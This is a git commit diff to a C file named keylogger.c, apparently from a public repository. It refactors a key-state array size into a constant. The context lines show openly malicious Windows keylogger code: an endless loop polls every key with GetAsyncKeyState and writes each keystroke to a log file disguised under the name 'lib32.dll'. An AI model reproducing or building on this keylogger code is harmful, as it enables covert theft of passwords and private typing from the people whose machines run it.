c43cb871435f0f8d18cba44571901c7b0ee373a0
cybersecuritydef <155002701+cybersecuritydef@users.noreply.github.com>
2026-06-03 12:49:52 +0300

    Update keylogger.c

--- keylogger.c
+++ keylogger.c
@@ -8,11 +8,12 @@
 
 #define KEY_LOG "lib32.dll"
 #define LEN_NAME 512
+#define MAX_STATE 255
 
 int main(int argc, char **argv){
     int i = 0;
     bool is_pressed = false;
-    bool state[255] = {false};
+    bool state[MAX_STATE] = {false};
     setlocale(LC_ALL, "Russian");
     char path[LEN_NAME] = {'\0'};
     char fullpath[LEN_NAME] = {'\0'};
@@ -20,7 +21,7 @@ int main(int argc, char **argv){
     PathRemoveFileSpec(path);
     snprintf(fullpath, LEN_NAME - 1, "%s\\%s", path, KEY_LOG);
     while(true){
-        for(i = 0; i < 255; i++){
+        for(i = 0; i < MAX_STATE; i++){
             is_pressed = (GetAsyncKeyState(i) & 0x8000) != 0;
             if(is_pressed && state[i] == false)
                 save_file(fullpath, key_value(i));
